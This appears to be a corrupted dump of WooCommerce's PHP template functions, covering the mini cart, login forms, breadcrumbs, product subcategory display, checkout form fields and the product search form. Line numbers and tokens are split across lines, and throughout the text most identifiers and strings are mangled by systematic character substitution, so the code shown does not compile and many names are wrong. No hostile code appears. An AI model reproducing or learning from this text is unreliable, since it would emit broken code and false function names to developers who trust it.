wc_g‘_‹m¶©e
Ğ'ÿ¹/üoss-£Îs.php', 
¬¿y
(

1173 'po¡s_³r_·ge' => 
$po¡s_³r_·ge
,

1174 'Üd”by' => 
$Üd”by
,

1175 'cŞumns' => 
$cŞumns


1182 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_mini_cart' ) ) {

1190 
funùiÚ
 
woocomm”û_mši_ÿ¹
Ğ
$¬gs
 = 
¬¿y
() ) {

1192 
$deçuÉs
 = 
¬¿y
(

1196 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1198 
wc_g‘_‹m¶©e
Ğ'ÿ¹/mši-ÿ¹.php', 
$¬gs
 );

1204 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_login_form' ) ) {

1213 
funùiÚ
 
woocomm”û_logš_fÜm
Ğ
$¬gs
 = 
¬¿y
() ) {

1215 
$deçuÉs
 = 
¬¿y
(

1218 'hidd’' => 
çl£


1221 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1223 
wc_g‘_‹m¶©e
Ğ'glob®/fÜm-logš.php', 
$¬gs
 );

1227 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_checkout_login_form' ) ) {

1236 
funùiÚ
 
woocomm”û_checkout_logš_fÜm
() {

1237 
wc_g‘_‹m¶©e
Ğ'checkout/fÜm-logš.php', 
¬¿y
Ğ'checkout' => 
WC
()->
checkout
() ) );

1241 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_breadcrumb' ) ) {

1249 
funùiÚ
 
woocomm”û_b»adüumb
Ğ
$¬gs
 = 
¬¿y
() ) {

1251 
$deçuÉs
 = 
­¶y_f‹rs
Ğ'woocomm”û_b»adüumb_deçuÉs', 
¬¿y
(

1253 'w¿p_befÜe' => '<Çv cÏss="woocomm”û-b»adüumb" ' . ( 
is_sšgË
() ? 'itemprop="breadcrumb"' : '' ) . '>',

1257 'home' => 
_x
( 'Home', 'breadcrumb', 'woocommerce' ),

1260 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1262 
wc_g‘_‹m¶©e
Ğ'glob®/b»adüumb.php', 
$¬gs
 );

1266 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_order_review' ) ) {

1275 
funùiÚ
 
woocomm”û_Üd”_»v›w
() {

1276 
wc_g‘_‹m¶©e
Ğ'checkout/»v›w-Üd”.php', 
¬¿y
Ğ'checkout' => 
WC
()->
checkout
() ) );

1280 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_checkout_coupon_form' ) ) {

1289 
funùiÚ
 
woocomm”û_checkout_coupÚ_fÜm
() {

1290 
wc_g‘_‹m¶©e
Ğ'checkout/fÜm-coupÚ.php', 
¬¿y
Ğ'checkout' => 
WC
()->
checkout
() ) );

1294 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_products_will_display' ) ) {

1303 
funùiÚ
 
woocomm”û_´oduùs_wl_di¥Ïy
() {

1304 iàĞ
is_shİ
() )

1305  
g‘_İtiÚ
( 'woocommerce_shop_page_display' ) != 'subcategories';

1307 iàĞ! 
is_´oduù_xÚomy
() )

1308  
	gçl£
;

1310 iàĞ
is_£¬ch
(è|| 
is_f‹»d
(è|| 
is_·ged
() )

1311  
	gŒue
;

1313 
	g$‹rm
 = 
g‘_qu”›d_objeù
();

1315 iàĞ
is_´oduù_ÿ‹gÜy
() ) {

1316  
g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm
->
‹rm_id
, 'di¥Ïy_ty³', 
Œue
 ) ) {

1322  
Œue
;

1326 iàĞ
g‘_İtiÚ
( 'woocommerce_category_archive_display' ) != 'subcategories' )

1327  
Œue
;

1333 
glob®
 
	g$wpdb
;

1335 
	g$·»Á_id
 = 
em±y
Ğ
$‹rm
->
‹rm_id
 ) ? 0 : $term->term_id;

1336 
	g$xÚomy
 = 
em±y
Ğ
$‹rm
->
xÚomy
 ) ? '' : $term->taxonomy;

1337 
	g$´oduùs_wl_di¥Ïy
 = 
Œue
;

1339 iàĞ! 
	g$·»Á_id
 && ! 
	g$xÚomy
 ) {

1340  
	gŒue
;

1343 iàĞ
	gçl£
 ==ğĞ
$´oduùs_wl_di¥Ïy
 = 
g‘_Œªs›Á
Ğ'wc_´oduùs_wl_di¥Ïy_' . 
$·»Á_id
 ) ) ) {

1344 
$has_chd»n
 = 
$wpdb
->
g‘_cŞ
Ğ$wpdb->
´•¬e
Ğ"SELECT”m_id FROM {$wpdb->‹rm_xÚomy} WHERE…¬’ˆğ%d ANDaxÚomy = %s", 
$·»Á_id
, 
$xÚomy
 ) );

1346 iàĞ
	g$has_chd»n
 ) {

1348 iàĞĞ
g‘_objeùs_š_‹rm
Ğ
$has_chd»n
, 
$xÚomy
 ) ) > 0 ) {

1349 
	g$´oduùs_wl_di¥Ïy
 = 
çl£
;

1352 
fÜ—ch
 ( 
$has_chd»n
 
as
 
$‹rm
 ) {

1353 
	g$chd»n
 = 
g‘_‹rm_chd»n
Ğ
$‹rm
, 
$xÚomy
 );

1355 iàĞĞ
g‘_objeùs_š_‹rm
Ğ
$chd»n
, 
$xÚomy
 ) ) > 0 ) {

1356 
	g$´oduùs_wl_di¥Ïy
 = 
çl£
;

1362 
	g$´oduùs_wl_di¥Ïy
 = 
Œue
;

1366 
£t_Œªs›Á
Ğ'wc_´oduùs_wl_di¥Ïy_' . 
$·»Á_id
, 
$´oduùs_wl_di¥Ïy
, 
YEAR_IN_SECONDS
 );

1368  
	g$´oduùs_wl_di¥Ïy
;

1372 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_product_subcategories' ) ) {

1382 
funùiÚ
 
woocomm”û_´oduù_subÿ‹gÜ›s
Ğ
$¬gs
 = 
¬¿y
() ) {

1383 
glob®
 
$wp_qu”y
;

1385 
	g$deçuÉs
 = 
¬¿y
(

1388 'fÜû_di¥Ïy' => 
çl£


1391 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1393 
exŒaù
Ğ
$¬gs
 );

1396 iàĞ! 
is_maš_qu”y
(è&& ! 
	g$fÜû_di¥Ïy
 ) ;

1399 iàĞ
is_£¬ch
(è|| 
is_f‹»d
(è|| 
is_·ged
(è|| ( ! 
is_´oduù_ÿ‹gÜy
(è&& ! 
is_shİ
() ) ) ;

1402 iàĞ
is_shİ
(è&& 
g‘_İtiÚ
( 'woocommerce_shop_page_display' ) == '' ) ;

1405 
	g$‹rm
 = 
g‘_qu”›d_objeù
();

1406 
	g$·»Á_id
 = 
em±y
Ğ
$‹rm
->
‹rm_id
 ) ? 0 : $term->term_id;

1408 iàĞ
is_´oduù_ÿ‹gÜy
() ) {

1409 
	g$di¥Ïy_ty³
 = 
g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm
->
‹rm_id
, 'di¥Ïy_ty³', 
Œue
 );

1411  
	g$di¥Ïy_ty³
 ) {

1416 iàĞ
g‘_İtiÚ
( 'woocommerce_category_archive_display' ) == '' )

1423 
	g$¬gs
 = 
­¶y_f‹rs
Ğ'woocomm”û_´oduù_subÿ‹gÜ›s_¬gs', 
¬¿y
(

1424 'chd_of' => 
$·»Á_id
,

1432 
	g$´oduù_ÿ‹gÜ›s
 = 
g‘_ÿ‹gÜ›s
Ğ
$¬gs
 );

1433 
	g$´oduù_ÿ‹gÜy_found
 = 
çl£
;

1435 iàĞ
	g$´oduù_ÿ‹gÜ›s
 ) {

1437 
fÜ—ch
 ( 
$´oduù_ÿ‹gÜ›s
 
as
 
$ÿ‹gÜy
 ) {

1439 iàĞ
	g$ÿ‹gÜy
->
	g·»Á
 !ğ
$·»Á_id
 ) {

1442 iàĞ
	g$¬gs
['hide_em±y'] && 
	g$ÿ‹gÜy
->
	gcouÁ
 == 0 ) {

1446 iàĞ! 
	g$´oduù_ÿ‹gÜy_found
 ) {

1448 
	g$´oduù_ÿ‹gÜy_found
 = 
Œue
;

1449 
echo
 
	g$befÜe
;

1452 
wc_g‘_‹m¶©e
Ğ'cÚ‹Á-´oduù_ÿt.php', 
¬¿y
(

1453 'ÿ‹gÜy' => 
$ÿ‹gÜy


1461 iàĞ
	g$´oduù_ÿ‹gÜy_found
 ) {

1462 iàĞ
is_´oduù_ÿ‹gÜy
() ) {

1463 
	g$di¥Ïy_ty³
 = 
g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm
->
‹rm_id
, 'di¥Ïy_ty³', 
Œue
 );

1465  
	g$di¥Ïy_ty³
 ) {

1467 
$wp_qu”y
->
po¡_couÁ
 = 0;

1468 
	g$wp_qu”y
->
	gmax_num_·ges
 = 0;

1471 iàĞ
g‘_İtiÚ
( 'woocommerce_category_archive_display' ) == 'subcategories' ) {

1472 
$wp_qu”y
->
po¡_couÁ
 = 0;

1473 
	g$wp_qu”y
->
	gmax_num_·ges
 = 0;

1478 iàĞ
is_shİ
(è&& 
g‘_İtiÚ
( 'woocommerce_shop_page_display' ) == 'subcategories' ) {

1479 
$wp_qu”y
->
po¡_couÁ
 = 0;

1480 
	g$wp_qu”y
->
	gmax_num_·ges
 = 0;

1483 
echo
 
	g$aá”
;

1484  
	gŒue
;

1490 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_subcategory_thumbnail' ) ) {

1500 
funùiÚ
 
woocomm”û_subÿ‹gÜy_thumbÇ
Ğ
$ÿ‹gÜy
 ) {

1501 
	g$sm®l_thumbÇ_size
 = 
­¶y_f‹rs
( 'single_product_small_thumbnail_size', 'shop_catalog' );

1502 
	g$dim’siÚs
 = 
wc_g‘_image_size
Ğ
$sm®l_thumbÇ_size
 );

1503 
	g$thumbÇ_id
 = 
g‘_woocomm”û_‹rm_m‘a
Ğ
$ÿ‹gÜy
->
‹rm_id
, 'thumbÇ_id', 
Œue
 );

1505 iàĞ
	g$thumbÇ_id
 ) {

1506 
	g$image
 = 
wp_g‘_©chm’t_image_¤c
Ğ
$thumbÇ_id
, 
$sm®l_thumbÇ_size
 );

1507 
	g$image
 = 
$image
[0];

1509 
	g$image
 = 
wc_¶aûhŞd”_img_¤c
();

1512 iàĞ
	g$image
 ) {

1515 
	g$image
 = 
¡r_»¶aû
Ğ' ', '%20', 
$image
 );

1517 
	gecho
 '<img src="' . 
esc_u¾
Ğ
$image
 ) . '"‡É="' . 
esc_©Œ
Ğ
$ÿ‹gÜy
->
Çme
 ) . '" width="' .ƒsc_©ŒĞ
$dim’siÚs
['width'] ) . '" height="' .ƒsc_attr( $dimensions['height'] ) . '" />';

1522 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_order_details_table' ) ) {

1532 
funùiÚ
 
woocomm”û_Üd”_d‘as_bË
Ğ
$Üd”_id
 ) {

1533 iàĞ! 
	g$Üd”_id
 ) ;

1535 
wc_g‘_‹m¶©e
Ğ'Üd”/Üd”-d‘as.php', 
¬¿y
(

1536 'Üd”_id' => 
$Üd”_id


1542 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_order_again_button' ) ) {

1552 
funùiÚ
 
woocomm”û_Üd”_agaš_bu‰Ú
Ğ
$Üd”
 ) {

1553 iàĞ! 
	g$Üd”
 || $Üd”->
	g¡©us
 != 'completed' )

1557 <
p
 
	gşass
="order-again">

1558 <
a
 
h»f
="<?ph°echØwp_nÚû_u¾Ğadd_qu”y_¬gĞ'Üd”_agaš', $Üd”->id ) , 'woocomm”û-Üd”_agaš' ); ?>" 
şass
="bu‰Ú"><?
php
 
_e
Ğ'Ord” Agaš', 'woocomm”û' ); ?></
	ga
>

1559 </
	gp
>

1560 <?
	gphp


1566 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_form_field' ) ) {

1579 
funùiÚ
 
woocomm”û_fÜm_f›ld
Ğ
$key
, 
$¬gs
, 
$v®ue
 = 
nuÎ
 ) {

1580 
$deçuÉs
 = 
¬¿y
(

1584 'maxËngth' => 
çl£
,

1585 '»quœed' => 
çl£
,

1586 'şass' => 
¬¿y
(),

1587 'Ïb–_şass' => 
¬¿y
(),

1588 'šput_şass' => 
¬¿y
(),

1589 '»tuº' => 
çl£
,

1590 'İtiÚs' => 
¬¿y
(),

1591 'cu¡om_©Œibu‹s' => 
¬¿y
(),

1592 'v®id©e' => 
¬¿y
(),

1596 
	g$¬gs
 = 
wp_·r£_¬gs
Ğ
$¬gs
, 
$deçuÉs
 );

1598 iàĞĞ! 
em±y
Ğ
$¬gs
['ş—r'] ) ) ) 
	g$aá”
 = '<div class="clear"></div>'; $after = '';

1600 iàĞ
	g$¬gs
['required'] ) {

1601 
	g$¬gs
['class'][] = 'validate-required';

1602 
	g$»quœed
 = ' <abb¸şass="»quœed"™Ë="' . 
esc_©Œ__
( 'required', 'woocommerce' ) . '">*</abbr>';

1604 
	g$»quœed
 = '';

1607 
	g$¬gs
['maxËngth'] = ( 
$¬gs
['maxËngth'] ) ? 'maxËngth="' . 
absšt
( $args['maxlength'] ) . '"' : '';

1609 iàĞ
is_¡ršg
Ğ
$¬gs
['label_class'] ) )

1610 
	g$¬gs
['Ïb–_şass'] = 
¬¿y
Ğ
$¬gs
['label_class'] );

1612 iàĞ
is_nuÎ
Ğ
$v®ue
 ) )

1613 
	g$v®ue
 = 
$¬gs
['default'];

1616 
	g$cu¡om_©Œibu‹s
 = 
¬¿y
();

1618 iàĞ! 
em±y
Ğ
$¬gs
['cu¡om_©Œibu‹s'] ) && 
is_¬¿y
( $args['custom_attributes'] ) )

1619 
fÜ—ch
 ( 
$¬gs
['cu¡om_©Œibu‹s'] 
as
 
$©Œibu‹
 => 
$©Œibu‹_v®ue
 )

1620 
$cu¡om_©Œibu‹s
[] = 
esc_©Œ
Ğ
$©Œibu‹
 ) . '="' .ƒsc_©ŒĞ
$©Œibu‹_v®ue
 ) . '"';

1622 iàĞ! 
em±y
Ğ
$¬gs
['validate'] ) )

1623 
fÜ—ch
Ğ
$¬gs
['v®id©e'] 
as
 
$v®id©e
 )

1624 
	g$¬gs
['şass'][] = 'v®id©e-' . 
$v®id©e
;

1626  
	g$¬gs
['type'] ) {

1629 
$couÁr›s
 = 
$key
 =ğ'shpšg_couÁry' ? 
WC
()->
couÁr›s
->
g‘_shpšg_couÁr›s
(è: WC()->couÁr›s->
g‘_®lowed_couÁr›s
();

1631 iàĞĞ
	g$couÁr›s
 ) == 1 ) {

1633 
$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1635 iàĞ
	g$¬gs
['label'] )

1636 
	g$f›ld
 .ğ'<Ïb– cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['label'] . '</label>';

1638 
	g$f›ld
 .ğ'<¡rÚg>' . 
cu¼’t
Ğ
¬¿y_v®ues
Ğ
$couÁr›s
 ) ) . '</strong>';

1640 
	g$f›ld
 .ğ'<špuˆty³="hidd’"‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" v®ue="' . 
cu¼’t
Ğ
¬¿y_keys
(
$couÁr›s
 ) ) . '" ' . 
im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . ' class="country_to_state" />';

1642 
	g$f›ld
 .ğ'</p>' . 
$aá”
;

1646 
	g$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">'

1647 . '<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–'] . 
	g$»quœed
 . '</label>'

1648 . '<£Ëù‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" cÏss="couÁry_to_¡©couÁry_£Ëù" ' . 
im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . '>'

1649 . '<İtiÚ v®ue="">'.
__
( 'Select‡ country&hellip;', 'woocommerce' ) .'</option>';

1651 
fÜ—ch
 ( 
$couÁr›s
 
as
 
$ckey
 => 
$cv®ue
 )

1652 
$f›ld
 .ğ'<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$ckey
 ) . '" '.
£Ëùed
Ğ
$v®ue
, $ckey, 
çl£
 ) .'>'.
__
Ğ
$cv®ue
, 'woocommerce' ) .'</option>';

1654 
	g$f›ld
 .= '</select>';

1656 
	g$f›ld
 .ğ'<nosüt><špuˆty³="subm™"‚ame="woocomm”û_checkout_upd©e_tÙ®s" v®ue="' . 
__
( 'Update country', 'woocommerce' ) . '" /></noscript>';

1658 
	g$f›ld
 .ğ'</p>' . 
$aá”
;

1666 
$couÁry_key
 = 
$key
 == 'billing_state'? 'billing_country' : 'shipping_country';

1668 iàĞ
is£t
Ğ
$_POST
[ 
$couÁry_key
 ] ) ) {

1669 
	g$cu¼’t_cc
 = 
wc_ş—n
Ğ
$_POST
[ 
$couÁry_key
 ] );

1670 } 
–£if
 ( 
is_u£r_logged_š
() ) {

1671 
	g$cu¼’t_cc
 = 
g‘_u£r_m‘a
Ğ
g‘_cu¼’t_u£r_id
(è, 
$couÁry_key
, 
Œue
 );

1672 iàĞ! 
	g$cu¼’t_cc
) {

1673 
	g$cu¼’t_cc
 = 
­¶y_f‹rs
('deçuÉ_checkout_couÁry', (
WC
()->
cu¡om”
->
g‘_couÁry
()è? WC()->cu¡om”->g‘_couÁry(è: WC()->
couÁr›s
->
g‘_ba£_couÁry
());

1675 } 
–£if
 ( 
$couÁry_key
 == 'billing_country' ) {

1676 
$cu¼’t_cc
 = 
­¶y_f‹rs
('deçuÉ_checkout_couÁry', (
WC
()->
cu¡om”
->
g‘_couÁry
()è? WC()->cu¡om”->g‘_couÁry(è: WC()->
couÁr›s
->
g‘_ba£_couÁry
());

1678 
	g$cu¼’t_cc
 = 
­¶y_f‹rs
('deçuÉ_checkout_couÁry', (
WC
()->
cu¡om”
->
g‘_shpšg_couÁry
()è? WC()->cu¡om”->g‘_shpšg_couÁry(è: WC()->
couÁr›s
->
g‘_ba£_couÁry
());

1681 
	g$¡©es
 = 
WC
()->
couÁr›s
->
g‘_¡©es
Ğ
$cu¼’t_cc
 );

1683 iàĞ
is_¬¿y
Ğ
$¡©es
 ) && 
em±y
( $states ) ) {

1685 
	g$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field" style="display:‚one">';

1687 iàĞ
	g$¬gs
['label'] )

1688 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–'] . 
	g$»quœed
 . '</label>';

1689 
	g$f›ld
 .ğ'<špuˆty³="hidd’" cÏss="hidd’"‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" v®ue="" ' . 
im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . '…ÏûhŞd”="' .ƒsc_©ŒĞ
$¬gs
['placeholder'] ) . '" />';

1690 
	g$f›ld
 .ğ'</p>' . 
$aá”
;

1692 } 
–£if
 ( 
is_¬¿y
Ğ
$¡©es
 ) ) {

1694 
	g$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1696 iàĞ
	g$¬gs
['label'] )

1697 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–']. 
	g$»quœed
 . '</label>';

1698 
	g$f›ld
 .ğ'<£Ëù‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" cÏss="¡©e_£Ëù" ' . 
im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . '…ÏûhŞd”="' .ƒsc_©ŒĞ
$¬gs
['placeholder'] ) . '">

1699 <
İtiÚ
 
	gv®ue
="">'.__Ğ'
S–eù
 
a
 
¡©e
&
h–l
;', '
	gwoocomm”û
' ) .'</
	gİtiÚ
>';

1701 
fÜ—ch
 ( 
$¡©es
 
as
 
$ckey
 => 
$cv®ue
 )

1702 
$f›ld
 .ğ'<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$ckey
 ) . '" '.
£Ëùed
Ğ
$v®ue
, $ckey, 
çl£
 ) .'>'.
__
Ğ
$cv®ue
, 'woocommerce' ) .'</option>';

1704 
	g$f›ld
 .= '</select>';

1705 
	g$f›ld
 .ğ'</p>' . 
$aá”
;

1709 
	g$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1711 iàĞ
	g$¬gs
['label'] )

1712 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–']. 
	g$»quœed
 . '</label>';

1713 
	g$f›ld
 .ğ'<špuˆty³="‹xt" cÏss="šput-‹xˆ' . 
im¶ode
Ğ' ', 
$¬gs
['šput_şass'] ) .'" v®ue="' . 
esc_©Œ
Ğ
$v®ue
 ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$¬gs['¶aûhŞd”'] ) . '"‚ame="' .ƒsc_©ŒĞ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" ' . im¶odeĞ' ', 
$cu¡om_©Œibu‹s
 ) . ' />';

1714 
	g$f›ld
 .ğ'</p>' . 
$aá”
;

1721 
$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1723 iàĞ
	g$¬gs
['label'] )

1724 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–']. 
	g$»quœed
 . '</label>';

1726 
	g$f›ld
 .ğ'<‹x»¨Çme="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="šput-‹xˆ' . 
im¶ode
Ğ' ', 
$¬gs
['šput_şass'] ) .'" id="' .ƒsc_©ŒĞ$key ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$¬gs['¶aûhŞd”'] ) . '"' . ( 
em±y
Ğ$¬gs['cu¡om_©Œibu‹s']['rows'] ) ? '„ows="2"' : '' ) . (ƒm±yĞ$¬gs['cu¡om_©Œibu‹s']['cŞs'] ) ? ' cŞs="5"' : '' ) . im¶odeĞ' ', 
$cu¡om_©Œibu‹s
 ) . '>'. 
esc_‹x»a
Ğ
$v®ue
 ) .'</textarea>

1727 </
	gp
>' . $after;

1732 
$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">

1733 <
šput
 
	gty³
="' .ƒsc_©ŒĞ$¬gs['ty³'] ) . '" 
şass
="šput-checkbox" 
Çme
="' .ƒsc_©ŒĞ$key ) . '" 
id
="' .ƒsc_©ŒĞ$key ) . '" 
v®ue
="1" '.checked( $value, 1, false ) .' />

1734 <
Ïb–
 ="' .ƒsc_©ŒĞ$key ) . '" 
şass
="checkbox ' . implode( ' ', $args['label_class'] ) .'" ' . implode( ' ', $custom_attributes ) . '>' . $args['label'] . $required . '</label>

1735 </
p
>' . $after;

1740 
$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1742 iàĞ
	g$¬gs
['label'] )

1743 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–']. 
	g$»quœed
 . '</label>';

1745 
	g$f›ld
 .ğ'<špuˆty³="·sswÜd" cÏss="šput-‹xˆ' . 
im¶ode
Ğ' ', 
$¬gs
['šput_şass'] ) .'"‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$¬gs['¶aûhŞd”'] ) . '" v®ue="' .ƒsc_©ŒĞ
$v®ue
 ) . '" ' . im¶odeĞ' ', 
$cu¡om_©Œibu‹s
 ) . ' />

1746 </
	gp
>' . $after;

1751 
$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1753 iàĞ
	g$¬gs
['label'] )

1754 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–'] . 
	g$»quœed
 . '</label>';

1756 
	g$f›ld
 .ğ'<špuˆty³="‹xt" cÏss="šput-‹xˆ' . 
im¶ode
Ğ' ', 
$¬gs
['šput_şass'] ) .'"‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '"…ÏûhŞd”="' .ƒsc_©ŒĞ$¬gs['¶aûhŞd”'] ) . '" '.
	g$¬gs
['maxËngth'].' v®ue="' .ƒsc_©ŒĞ
$v®ue
 ) . '" ' . im¶odeĞ' ', 
$cu¡om_©Œibu‹s
 ) . ' />

1757 </
	gp
>' . $after;

1762 
$İtiÚs
 = '';

1764 iàĞ! 
em±y
Ğ
$¬gs
['options'] ) )

1765 
fÜ—ch
 ( 
$¬gs
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ_‹xt
 )

1766 
$İtiÚs
 .ğ'<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$İtiÚ_key
 ) . '" '. 
£Ëùed
Ğ
$v®ue
, $İtiÚ_key, 
çl£
 ) . '>' .ƒsc_©ŒĞ
$İtiÚ_‹xt
 ) .'</option>';

1768 
	g$f›ld
 = '<°şass="fÜm-row ' . 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$¬gs
['şass'] ) ) .'" id="' .ƒsc_©ŒĞ
$key
 ) . '_field">';

1770 iàĞ
	g$¬gs
['label'] )

1771 
	g$f›ld
 .ğ'<Ïb– fÜ="' . 
esc_©Œ
Ğ
$key
 ) . '" cÏss="' . 
im¶ode
Ğ' ', 
$¬gs
['Ïb–_şass'] ) .'">' . 
	g$¬gs
['Ïb–']. 
	g$»quœed
 . '</label>';

1773 
	g$f›ld
 .ğ'<£Ëù‚ame="' . 
esc_©Œ
Ğ
$key
 ) . '" id="' .ƒsc_©ŒĞ$key ) . '" cÏss="£Ëù" ' . 
im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ) . '>

1775 </
	g£Ëù
>

1776 </
	gp
>' . $after;

1781 
$f›ld
 = 
­¶y_f‹rs
Ğ'woocomm”û_fÜm_f›ld_' . 
$¬gs
['ty³'], '', 
$key
, $¬gs, 
$v®ue
 );

1786 iàĞ
	g$¬gs
['»tuº'] )  
	g$f›ld
; 
echo
 $field;

1790 iàĞ! 
funùiÚ_exi¡s
( 'get_product_search_form' ) ) {

1801 
funùiÚ
 
g‘_´oduù_£¬ch_fÜm
Ğ
$echo
 = 
Œue
 ) {

1802 
do_aùiÚ
( 'get_product_search_form' );

1804 
	g$£¬ch_fÜm_‹m¶©e
 = 
loÿ‹_‹m¶©e
( 'product-searchform.php' );

1805 iàĞ'' !ğ
$£¬ch_fÜm_‹m¶©e
 ) {

1806 
»quœe
 
$£¬ch_fÜm_‹m¶©e
;

1810 
	g$fÜm
 = '<fÜm„Şe="£¬ch" m‘hod="g‘" id="£¬chfÜm"‡ùiÚ="' . 
esc_u¾
Ğ
home_u¾
( '/' ) ) . '">

1811 <
div
>

1812 <
Ïb–
 
şass
="sü“n-»ad”-‹xt" ="s">' . __Ğ'
S—rch
 :', '
woocomm”û
' ) . '</label>

1813 <
šput
 
ty³
="‹xt" 
v®ue
="' . g‘_£¬ch_qu”y(è. '" 
Çme
="s" 
id
="s" 
¶aûhŞd”
="' . __( 'Search for…roducts', 'woocommerce' ) . '" />

1814 <
šput
 
ty³
="subm™" 
id
="£¬chsubm™" 
v®ue
="'.ƒsc_attr__( 'Search', 'woocommerce' ) .'" />

1815 <
šput
 
ty³
="hidd’" 
Çme
="po¡_ty³" 
v®ue
="product" />

1816 </
div
>

1817 </
fÜm
>';

1819 iàĞ
$echo
 )

1820 
echo
 
­¶y_f‹rs
Ğ'g‘_´oduù_£¬ch_fÜm', 
$fÜm
 );

1822  
­¶y_f‹rs
Ğ'g‘_´oduù_£¬ch_fÜm', 
$fÜm
 );

	@includes/wc-template-hooks.php

1 <?
php


